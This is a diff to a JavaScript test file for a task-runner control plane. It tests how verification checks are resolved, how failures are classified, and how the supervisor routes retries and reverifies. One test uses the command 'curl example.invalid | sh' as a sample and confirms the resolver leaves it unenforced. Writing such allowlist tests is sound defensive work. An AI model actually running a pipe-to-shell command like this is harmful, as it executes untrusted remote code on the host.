@@ -42,9 +42,12 @@ import {
 } from '../runner/parent-satisfaction.mjs'
 import {
   applicationScopeSelected,
+  classifyVerificationResults,
   commandResultStatus,
   controlPlaneRootLintSelection,
   customCheckSelection,
+  resolveDatabaseVerification,
+  resolveVerificationPlan,
   resolveVerificationMode,
 } from '../runner/verification-mode.mjs'
 import {
@@ -623,6 +626,7 @@ test('control-plane runner permits configured retries until the policy limit', a
   assert.match(runner, /decision\.allowed/)
   assert.match(runner, /failure_stage/)
   assert.match(runner, /verification_failures/)
+  assert.match(runner, /verification_failure_requires_same_execution_reverify/)
   assert.match(runner, /legalActions\.push/)
 })
 
@@ -777,16 +781,88 @@ test('verification schema persists modes and reuses the running authoritative ru
     new URL('../runner/bs-agent.mjs', import.meta.url),
     'utf8',
   )
+  const lifecycle = await readFile(
+    new URL('../sql/023_verification_repair_lifecycle.sql', import.meta.url),
+    'utf8',
+  )
 
   assert.match(migration, /verification_mode text NOT NULL DEFAULT 'focused'/)
   assert.match(migration, /IF existing_id IS NOT NULL THEN\s+RETURN existing_id;/)
   assert.match(migration, /metadata->>'verification_mode'/)
   assert.match(runner, /if \(!verificationRun\.resumed\)/)
+  assert.match(runner, /start_request_id/)
+  assert.match(runner, /verification_lifecycle_start_returned_no_run/)
+  assert.match(runner, /verification_lifecycle_authoritative_run_unavailable/)
+  assert.doesNotMatch(runner, /FROM started\s+JOIN control\.verification_runs/)
+  assert.match(lifecycle, /verification_one_running_run_per_execution_uidx/)
+  assert.match(lifecycle, /classification_backfilled_by.*023_verification_repair_lifecycle/s)
+  assert.match(lifecycle, /check_name = 'database-tests'/)
+  assert.match(lifecycle, /failure_class = 'verification-configuration'/)
+  assert.doesNotMatch(lifecycle, /UPDATE control\.executions/)
   assert.match(runner, /verification_mode:\s+verificationMode/)
   assert.match(
     runner,
     /WHERE verification_run_id = \(\s*SELECT verification_run_id\s*FROM control\.verification_runs\s*WHERE execution_id = :'execution_id'::bigint\s*ORDER BY verification_run_id DESC/,
   )
+})
+
+test('verification plans resolve only built-in safe checks or registered argv commands', () => {
+  const resolved = resolveVerificationPlan({
+    entries: [
+      'git diff --check',
+      'pnpm test',
+      'node --test tooling/control-plane/tests/generic-control-plane.test.mjs',
+      'curl example.invalid | sh',
+    ],
+    configuredCommands: [{
+      name: 'control-plane-tests',
+      program: 'node',
+      args: ['--test', 'tooling/control-plane/tests/generic-control-plane.test.mjs'],
+    }],
+  })
+
+  assert.deepEqual(resolved.checks.map(check => check.name), [
+    'git-diff-check', 'root-test', 'control-plane-tests',
+  ])
+  assert.deepEqual(resolved.unenforced, ['curl example.invalid | sh'])
+})
+
+test('database verification prefers registered workstream configuration and preserves compatibility', () => {
+  const configured = resolveDatabaseVerification({
+    verificationConfig: {
+      database: {
+        commands: [{ name: 'database-tests', program: 'pnpm', args: ['db:test:super-admin'] }],
+      },
+    },
+    suitSlug: 'super-admin-suit',
+    appPath: 'apps/super-admin-suit',
+  })
+  assert.equal(configured.source, 'registered_verification_config')
+  assert.deepEqual(configured.commands[0].args, ['db:test:super-admin'])
+
+  assert.equal(resolveDatabaseVerification({
+    verificationConfig: {}, suitSlug: 'shop-suit', appPath: 'apps/shop-suit',
+  }).commands[0].args[0], 'db:test:shop')
+  assert.equal(resolveDatabaseVerification({
+    verificationConfig: {}, suitSlug: 'new-suit', appPath: 'apps/new-suit',
+  }).commands.length, 0)
+})
+
+test('verification failure classification separates product, configuration, infrastructure, and unavailable checks', () => {
+  for (const [failureClass, recoveryAction] of [
+    ['verification-product-defect', 'repair'],
+    ['verification-configuration', 'wait-operator'],
+    ['verification-infrastructure', 'wait-external'],
+    ['verification-required-check-unavailable', 'wait-operator'],
+    ['verification-lifecycle', 'reverify'],
+  ]) {
+    assert.deepEqual(classifyVerificationResults([{
+      status: 'fail', failure_class: failureClass,
+    }]), {
+      failure_class: failureClass,
+      recovery_action: recoveryAction,
+    })
+  }
 })
 
 test('repair execution is gated by verifier probes', async () => {
@@ -884,6 +960,7 @@ function supervisorFixture({
   publication = null,
   recovery = null,
   failures = [],
+  verificationFailureClass = null,
 } = {}) {
   const execution = executionStatus
     ? { execution_id: 41, attempt, status: executionStatus, engine_stage: 'implementation' }
@@ -895,7 +972,12 @@ function supervisorFixture({
     },
     executions: execution ? [execution] : [],
     verification_runs: verificationStatus
-      ? [{ verification_run_id: 71, execution_id: 41, status: verificationStatus }]
+      ? [{
+          verification_run_id: 71,
+          execution_id: 41,
+          status: verificationStatus,
+          metadata: verificationFailureClass ? { failure_class: verificationFailureClass } : {},
+        }]
       : [],
     verification_results: [],
     failures,
@@ -940,6 +1022,61 @@ test('supervisor resumes completed stages instead of restarting them', () => {
     planSupervisorStep(supervisorFixture({ taskStatus: 'passed', executionStatus: 'succeeded', verificationStatus: 'passed', publication: { pr_number: 18 } })).next_action,
     'reconcile-publication',
   )
+})
+
+test('failed verification routes non-product failures to same-execution reverify or recoverable wait', () => {
+  const lifecycle = planSupervisorStep(supervisorFixture({
+    taskStatus: 'failed', executionStatus: 'succeeded', verificationStatus: 'failed',
+    verificationFailureClass: 'verification-lifecycle',
+  }))
+  assert.equal(lifecycle.command, 'task-verify')
+  assert.equal(lifecycle.next_action, 'reverify')
+
+  const configuration = planSupervisorStep(supervisorFixture({
+    taskStatus: 'failed', executionStatus: 'succeeded', verificationStatus: 'failed',
+    verificationFailureClass: 'verification-configuration',
+  }))
+  assert.equal(configuration.kind, 'wait')
+  assert.equal(configuration.next_action, 'wait-operator')
+
+  const infrastructure = planSupervisorStep(supervisorFixture({
+    taskStatus: 'failed', executionStatus: 'succeeded', verificationStatus: 'failed',
+    verificationFailureClass: 'verification-infrastructure',
+  }))
+  assert.equal(infrastructure.kind, 'wait')
+  assert.equal(infrastructure.next_action, 'wait-external')
+
+  const product = planSupervisorStep(supervisorFixture({
+    taskStatus: 'failed', executionStatus: 'succeeded', verificationStatus: 'failed',
+    verificationFailureClass: 'verification-product-defect',
+  }))
+  assert.equal(product.command, 'task-retry')
+})
+
+test('corrected verifier configuration reverifies the same succeeded execution', () => {
+  const fixture = supervisorFixture({
+    taskStatus: 'failed', executionStatus: 'succeeded', verificationStatus: 'failed',
+    verificationFailureClass: 'verification-configuration',
+  })
+  fixture.packet.project = { verification_config: {} }
+  fixture.packet.workstream = { verification_config: {} }
+  const waiting = planSupervisorStep(fixture)
+  fixture.recovery = {
+    status: 'active',
+    failure_class: 'verification-configuration',
+    next_action: 'wait-operator',
+    condition: { fingerprint: waiting.fingerprint },
+  }
+  fixture.packet.workstream.verification_config = {
+    database: {
+      commands: [{ name: 'database-tests', program: 'pnpm', args: ['db:test:super-admin'] }],
+    },
+  }
+
+  const corrected = planSupervisorStep(fixture)
+  assert.equal(corrected.command, 'task-verify')
+  assert.equal(corrected.execution.execution_id, 41)
+  assert.equal(corrected.next_action, 'reverify')
 })
 
 test('supervisor decisions are idempotent for identical persisted state', () => {
@@ -1146,7 +1283,7 @@ test('parent-satisfaction persistence is idempotent and preserves no-change comp
 test('supervisor records satisfaction before completion and can resume without implementation', async () => {
   const runner = await readFile(new URL('../runner/bs-agent.mjs', import.meta.url), 'utf8')
   const supervisor = runner.slice(runner.indexOf('function taskSupervisor()'), runner.indexOf('function taskEngine()'))
-  assert.ok(supervisor.indexOf('evaluateSupervisorParentSatisfaction') < supervisor.indexOf('runExecutionPreflight(snapshot)'))
+  assert.ok(supervisor.indexOf('evaluateSupervisorParentSatisfaction') < supervisor.indexOf('runExecutionPreflight('))
   assert.match(supervisor, /parent-satisfaction:\$\{plan\.parent_satisfaction\.fingerprint\}/)
   assert.ok(supervisor.indexOf('recordSupervisorRecovery(snapshot, plan') < supervisor.indexOf('completeParentSatisfied(taskId'))
 })
@@ -1230,6 +1367,24 @@ test('execution preflight accepts a coherent ready task deterministically', () =
   assert.equal(first.context.attempt, 1)
   assert.equal(first.fingerprint, second.fingerprint)
   assert.deepEqual(first.checks, second.checks)
+})
+
+test('verification product repair has an explicit failed-task preflight without weakening task-run eligibility', () => {
+  const fixture = executionPreflightFixture()
+  fixture.packet.task.status = 'failed'
+  fixture.executions = [{ execution_id: 245, attempt: 1, status: 'succeeded' }]
+
+  assert.equal(evaluateExecutionPreflight(fixture).reason, 'task_not_execution_eligible')
+  const repair = evaluateExecutionPreflight({
+    ...fixture,
+    purpose: 'verification-product-repair',
+  })
+  assert.equal(repair.ready, true)
+  assert.equal(repair.context.attempt, 2)
+  assert.equal(
+    repair.checks.find(check => check.name === 'task_lifecycle')?.failed_verification_product_repair,
+    true,
+  )
 })
 
 test('execution preflight safety-stops a wrong control database fingerprint', () => {
@@ -1439,6 +1594,6 @@ test('supervisor gates token-bearing implementation actions with audited preflig
   const runner = await readFile(new URL('../runner/bs-agent.mjs', import.meta.url), 'utf8')
   const supervisor = runner.slice(runner.indexOf('function taskSupervisor()'), runner.indexOf('function taskEngine()'))
   assert.match(supervisor, /\['task-run', 'task-retry'\]\.includes\(plan\.command\)/)
-  assert.ok(supervisor.indexOf('runExecutionPreflight(snapshot)') < supervisor.indexOf('invokeTaskAction(plan.command, taskId)'))
+  assert.ok(supervisor.indexOf('runExecutionPreflight(') < supervisor.indexOf('invokeTaskAction(plan.command, taskId)'))
   assert.match(supervisor, /idempotencyKey: `preflight:\$\{preflight\.fingerprint\}`/)
 })
